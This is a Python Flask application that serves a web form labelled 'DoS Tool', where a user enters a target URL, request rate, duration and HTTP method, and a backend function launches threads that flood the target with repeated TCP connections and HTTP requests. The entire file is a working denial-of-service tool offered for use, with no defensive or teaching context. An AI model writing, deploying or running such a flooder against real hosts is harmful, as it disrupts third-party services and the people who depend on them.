from flask import Flask, request, jsonify, render_template_string
import socket
import threading
import time

app = Flask(__name__)

def dos_attack(target_ip, target_port, request_rate, duration, method):
    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.sendto(f"{method} / HTTP/1.1\r\n".encode(), (target_ip, target_port))
                s.sendto(f"Host: {target_ip}\r\n\r\n".encode(), (target_ip, target_port))
                s.close()
            except:
                pass

    for _ in range(request_rate):
        thread = threading.Thread(target=attack)
        thread.start()

@app.route("/")
def index():
    html_code = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>DoS Tool</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 0;
                background-color: #f4f4f4;
            }
            .container {
                width: 50%;
                margin: 50px auto;
                padding: 20px;
                background: #fff;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            }
            h1 {
                color: #333;
                text-align: center;
            }
            label {
                display: block;
                margin-top: 15px;
                font-weight: bold;
            }
            input, select, button {
                width: 100%;
                padding: 10px;
                margin-top: 5px;
                border: 1px solid #ddd;
                border-radius: 5px;
            }
            button {
                background-color: #28a745;
                color: white;
                font-weight: bold;
                cursor: pointer;
            }
            button:hover {
                background-color: #218838;
            }
            .log {
                margin-top: 20px;
                padding: 10px;
                background: #f9f9f9;
                border: 1px solid #ddd;
                border-radius: 5px;
                height: 150px;
                overflow-y: scroll;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>DoS Tool</h1>
            <label for="target_url">Target URL</label>
            <input type="text" id="target_url" placeholder="http://example.com">
            
            <label for="request_rate">Request Rate (per second)</label>
            <input type="number" id="request_rate" value="100">
            
            <label for="duration">Duration (seconds)</label>
            <input type="number" id="duration" value="30">
            
            <label for="method">Method</label>
            <select id="method">
                <option value="GET">GET</option>
                <option value="POST">POST</option>
            </select>
            
            <button id="start_button">Start</button>
            
            <div class="log" id="log_area"></div>
        </div>
        <script>
            document.getElementById("start_button").addEventListener("click", () => {
                const target_url = document.getElementById("target_url").value;
                const request_rate = document.getElementById("request_rate").value;
                const duration = document.getElementById("duration").value;
                const method = document.getElementById("method").value;

                fetch("/start", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        target_url: target_url,
                        request_rate: request_rate,
                        duration: duration,
                        method: method
                    })
                })
                .then(response => response.json())
                .then(data => {
                    const logArea = document.getElementById("log_area");
                    if (data.status === "success") {
                        logArea.textContent = "Attack started!";
                    } else {
                        logArea.textContent = `Error: ${data.message}`;
                    }
                })
                .catch(err => {
                    document.getElementById("log_area").textContent = `Error: ${err.message}`;
                });
            });
        </script>
    </body>
    </html>
    """
    return render_template_string(html_code)

@app.route("/start", methods=["POST"])
def start_attack():
    data = request.json
    target_url = data.get("target_url")
    request_rate = int(data.get("request_rate"))
    duration = int(data.get("duration"))
    method = data.get("method", "GET")

    try:
        target_ip = target_url.split("://")[1].split("/")[0]
        target_port = 80
    except IndexError:
        return jsonify({"status": "error", "message": "Invalid Target URL"}), 400

    dos_attack(target_ip, target_port, request_rate, duration, method)
    return jsonify({"status": "success", "message": "Attack started!"})

if __name__ == "__main__":
    app.run(debug=True)
